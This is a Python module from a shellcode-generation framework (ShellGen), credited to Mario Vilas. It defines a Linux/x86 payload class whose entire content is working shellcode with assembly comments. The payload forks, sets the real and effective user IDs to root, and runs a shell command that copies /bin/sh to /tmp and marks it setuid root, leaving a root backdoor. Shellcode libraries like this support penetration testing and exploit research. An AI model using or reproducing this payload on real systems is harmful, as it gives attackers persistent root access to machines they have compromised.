#!/usr/bin/env python

###############################################################################
## Fork and drop a suid shell in /tmp for Linux/x86                          ##
## Shellcode for ShellGen                                                    ##
## Based on original code by anonymous author                                ##
## http://www.shell-storm.org/shellcode/files/shellcode-540.php              ##
###############################################################################

# Copyright (c) 2012 Mario Vilas
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

__all__ = ["DropSuidShell"]

from shellgen import Static

class DropSuidShell (Static):
    arch      = "x86"
    os        = "linux"
    requires  = []
    provides  = ["payload", "root"]
    qualities = ["termnull"]

    bytes = (

        # main: if (fork()) goto exeunt; else goto carryon;
        "\x29\xc0"                               #  sub eax, eax
        "\xb0\x02"                               #  mov al, 2
        "\xcd\x80"                               #  int 0x80
        "\x85\xc0"                               #  test eax, eax
        "\x75\x02"                               #  jnz exeunt
        "\xeb\x05"                               #  jmp carryon

        #  exeunt: exit(x);
        "\x29\xc0"                               #  sub eax, eax
        "\x40"                                   #  inc eax
        "\xcd\x80"                               #  int 0x80

        #  carryon: setreuid(0, 0); goto callz;
        "\x29\xc0"                               #  sub eax, eax
        "\x29\xdb"                               #  sub ebx, ebx
        "\x29\xc9"                               #  sub ecx, ecx
        "\xb0\x46"                               #  mov al, 0x46
        "\xcd\x80"                               #  int 0x80
        "\xeb\x2a"                               #  jmp callz

        #  start: execve()
        "\x5e"                                   #  pop esi
        "\x89\x76\x32"                           #  mov [ebp+0x32], esi
        "\x8d\x5e\x08"                           #  lea ebx, [ebp+0x08]
        "\x89\x5e\x36"                           #  mov [ebp+0x36], ebx
        "\x8d\x5e\x0b"                           #  lea ebx, [ebp+0x0b]
        "\x89\x5e\x3a"                           #  mov [ebp+0x3a], ebx
        "\x29\xc0"                               #  sub eax, eax
        "\x88\x46\x07"                           #  mov [ebp+0x07], al
        "\x88\x46\x0a"                           #  mov [ebp+0x0a], al
        "\x88\x46\x31"                           #  mov [ebp+0x31], al
        "\x89\x46\x3e"                           #  mov [ebp+0x3e], eax
        "\x87\xf3"                               #  xchg esi, ebx
        "\xb0\x0b"                               #  mov al, 0x0b
        "\x8d\x4b\x32"                           #  lea ecx, [ebp+edi+0x32]
        "\x8d\x53\x3e"                           #  lea edx, [ebp+edi+0x3e]
        "\xcd\x80"                               #  int 0x80

        #  callz: call start
        "\xe8\xd1\xff\xff\xff"                   #  call start

        #  data - command to execve()
        "/bin/sh -c cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh"
        "\x00"
    )
